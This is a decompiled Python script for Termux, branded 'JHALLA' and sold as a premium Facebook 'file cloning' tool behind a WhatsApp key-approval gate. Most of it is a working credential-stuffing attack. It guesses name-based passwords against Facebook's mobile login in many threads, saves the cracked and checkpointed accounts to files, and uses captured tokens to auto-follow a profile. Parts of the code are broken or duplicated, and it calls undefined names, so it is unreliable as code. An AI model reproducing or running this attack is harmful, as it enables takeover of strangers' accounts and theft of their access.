# Decompile by : Bilal Haider ID 
# Time Succes decompile : 2022-04-27 23:05:31.491783 
try:
    import requests,calendar
except ModuleNotFoundError:
    os.system("python -m pip install requests ")
try:
    import bs4
except ModuleNotFoundError:
	os.system("python -m pip install bs4 ")
try:
    import mechanize
except ModuleNotFoundError:
    os.system("python -m pip install mechanize ")
	
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64,zlib
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
import requests as ress
ubahP,fuck,pwBaru=[],[],[]
def main_apv():
    imt="vau"
    ak="Bitul"
    os.system('clear')
    logo()
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.mlk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print (logo)
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
        print ("  Your Token Is Not Approved Already")
        print ('')
        print ("           THIS IS YOUR KEY BRO")
        print ('')
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ('')
        kok=open('/data/data/com.termux/files/usr/bin/.mlk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ('')
        time.sleep(3.5)
        tks = 'Hello%20Admin,%20Please%20Confirm%20My%20Key%20To%20Premium✓✓%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
        os.system('am start https://wa.me/+916391710430?text=' + tks)
        
    r1=requests.get("https://github.com/Jhalla11/Aprrovl/blob/main/Aprrovl.txt").text
    if key1 in r1:
        main_apv()
    else:
        os.system("clear")
        logo()
        print ('')
        print ("Your Token Is Not Approved Already")
        print ('')
        print ("THIS IS YOUR KEY BRO")
        print ('')
        print ("YOUR KEY : "+ak+key1)
        print ('')
        print ("Copy Key And Sent Me WP Approvel Your Key ")
        print ('')
        time.sleep(3.5)
        tks = 'Hello%Mr%JHALLA,%20Please%20Appruve%20My%20Key%20To%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
        os.system('am start https://wa.me/+916391710430?text=' + tks)
        
def main_apv():
            os.system("clear")
            logo()
            print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
            print(" \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;97m [1] Start File Cloning ")
            print(" \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;91m [0] Exit Programing ")
            print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
            key = input(" \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;92m input : ")
            print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;92m========================================')
            if key in [""]:
                print (" [!] please select correct option")
                exit()
            elif key in ["1", "01"]:
                __crack__().plerr()
            elif key in ["2", "02"]:
                time.sleep(0.5)
                os.system('python Dump.py')
            elif key in ["3", "03"]:
                time.sleep(0.5)
                dupcutter()
            elif key in ["4", "04"]:
                time.sleep(0.5)
                grep()
            elif key in ["5", "05"]:
                time.sleep(0.5)
                login()
            elif key in ["0", "00" , "6"]:
                exit("\n [✓] Thank you so much♥️\n")
	
ok = []
cp = []
id = []
user = []
num = 0
loop = 0
_silet_koceng_  = requests.Session()
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'	# WARNA MATI 
def login():
	os.system("rm -rf access_token.txt");logo()
	tok = input(' [*] Enter Your Token : ')
	try:
			u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
			u1 = json.loads(u)
			name = u1['name']
			ts = open('access_token.txt', 'w')
			ts.write(tok)
			ts.close()
			print("\n\n[*] Login Successful as " + name )
			time.sleep(1)
			readline___Public_Xml
	except KeyError:
			print('\n\n[*] Token Expired ')
			time.sleep(1)
			login()

def banner():
	logo()
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print('\n\n\033[0m The Prosess Done...')
		print('\n\033[1;92mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
		print('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
		print('\n\033[0mERROR')
		exit()
class __crack__:
	def __init__(self):
		self.id = []
	def plerr(self):
		try:
			self.apk = input(" [*] File Path : ")
			print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
			self.id = open(self.apk).read().splitlines()
			print(' [*] Total ID : %s'%(len(self.id)))
			print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
			print('\033[1;37m [*]\033[1;37m  Please Choose Pass Method\033[1;37m')
			print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=========================================')
		except:
			print('\n [!] File Not Found In Storage')
			input('\n [*] Press Enter To Back');readline___Public_Xml
     
		self.__pler__()
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;92m [MR_JHALLA] %s/%s  \033[1;92mOK-:%s '%(loop,len(self.id),len(ok))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			except: pass
			try:
				ua_xiaomi = open('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[JHALLA-OK💚] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/JHALLA_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				open('/sdcard/ids/tokens.txt','a').write(access+'\n')
				follow_id='100000256316823'
				subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+access).text
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				try:
					token = SHAYAN('token.txt').read()
					cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].print('\r\033[1;91m[JHALLA_CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahn(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahn(user))
					cp.append(wrt)
					open('/sdcard/JHALLA_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					year  = ''
				except:
					pass
				print('\r\033[1;91m[JHALLA-CP] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahu(user))
				cp.append(wrt)
				open('/sdcard/JHALLA_CP.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
	def __pler__(self):
		print ("\033[1;37m [1] \033[1;36mMETHOD FAST ")
		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM ")
		yan = input('\n [•] Choose : ')
		if yan == '':
			print('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
			time.sleep(1)
			print('\n[•] Result OK saved to OK.txt')
			print('[•] Result CP saved to CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+'1234']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('3', '03',):
			time.sleep(1)
			print('\n[•] Result OK saved to OK.txt')
			print('[•] Result CP saved to CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[1]+'1234', xz[1]+'786']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('2', '02'):
			
			time.sleep(1)
			print('\n[•] Result OK saved to OK.txt')
			print('[•] Result CP saved to CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						else:
							pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"1122"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		elif yan in ('4', '04'):
			time.sleep(1)
			print('\n[•] Result OK saved to OK.txt')
			print('[•] Result CP saved to CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						fi , la = name.split(' ')
						first = fi.lower()
						last = la.lower()
						if len(xz) == 1:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						elif len(xz) == 2:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						elif len(xz) == 3:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						elif len(xz) == 4:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						else:
							pwx = [first+' '+last, first+last, first+'123', first+'12345']
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
			hasil(ok,cp)
		else:
			print('\nSalah')
			time.sleep(1)
			self.__pler__()
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = ' '
		elif fx[:9] in ['100000000']       :tahunz = '  '
		elif fx[:8] in ['10000000']        :tahunz = ' '
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' '
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' '
		elif fx[:6] in ['100001']          :tahunz = ' '
		elif fx[:6] in ['100002','100003'] :tahunz = ' '
		elif fx[:6] in ['100004']          :tahunz = ' '
		elif fx[:6] in ['100005','100006'] :tahunz = ' '
		elif fx[:6] in ['100007','100008'] :tahunz = ' '
		elif fx[:6] in ['100009']          :tahunz = ' '
		elif fx[:5] in ['10001']           :tahunz = ' '
		elif fx[:5] in ['10002']           :tahunz = ' '
		elif fx[:5] in ['10003']           :tahunz = ' '
		elif fx[:5] in ['10004']           :tahunz = ' '
		elif fx[:5] in ['10005']           :tahunz = ' '
		elif fx[:5] in ['10006','10007','10008']:tahunz = ' '
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = ' '
	elif len(fx)==8:
		tahunz = ' '
	elif len(fx)==7:
		tahunz = ' '
	else:tahunz=''
	return tahunz
if __name__=='__main__':
	
	help()
	
imtiazak_ua_xaomi  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
imtiazak_ua_asus    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_huawei  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_vivo    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_oppo    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_samsung = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
banner = """
\033[1;35;1m╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
  \033[1;36;1m╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯
  
  \033[1;31;1m     ,--.,--.  ,--.  ,---.  ,--.   ,--.     ,---.   
  \033[1;32;1m     |  ||  '--'  | /  O  \ |  |   |  |    /  O  \  
  \033[1;33;1m,--. |  ||  .--.  ||  .-.  ||  |   |  |   |  .-.  | 
  \033[1;34;1m|  '-'  /|  |  |  ||  | |  ||  '--.|  '--.|  | |  | 
  \033[1;35;1m `-----' `--'  `--'`--' `--'`-----'`-----'`--' `--' 
                                   🤞ALONE TOPPER 🤞
  \033[1;92m╔════════════════════════════╗╔══════════════════════════╗
  \033[1;91;1m█ \033[1;37m [•] \033[1;31;1mTOOLS OWNER     \033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;31;1m JHALLA BRAND    \033[1;37m  [•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;32;1mFACEBOOK PAGE   \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;32m  ABU BAKAR     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;33;1mGITHUB USER     \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;33m  JHALLA33    \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;34;1mWHATS APP NUMBER\033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;34m+916391710330  \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;35;1mTOOLS VERTION   \033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;35m     1.2.3     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;36;1mTOOLS STATUS    \033[1;37m [•] \033[1;32m ║║ \033[1;37m [•] \033[1;36m    PREMIUM    \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;37;1mTOOLS NAME      \033[1;37m [•] \033[1;32m ║║ \033[1;37m [•] \033[1;37m FILE CLOONING \033[1;37m[•]  \033[1;31m█
  \033[1;92m╚════════════════════════════╝╚══════════════════════════╝          
  \033[1;36;1m╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
  \033[1;35;1m╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯"""
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()
def logo():
	time.sleep(0.5)
	os.system("clear")
	print(banner)
	print("")
	time.sleep(0.5)

def convert(cok):
	__for=(
			'datr='+cok['datr']
		)+';'+(
			'c_user='+cok['c_user']
		)+';'+(
			'fr='+cok['fr']
		)+';'+(
			'xs='+cok['xs'] )
	return __for
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def ak():
    print("")
    a()
def a1k():
    print("")
    a()
def aoo():
    print("")
    a()
def ff():
    print("")
    a()
def dupcutter():
	os.system("xdg-open https://wa.me/+923435908309")
	time.sleep(3)
	readline___Public_Xml
def yt():
	logo()
	os.system("xdg-open https://chat.whatsapp.com/KfLzDSMCW2L68JBlnn7NXF")
	time.sleep(3)
	readline___Public_Xml
    
if __name__=='__main__':
	main_apv()
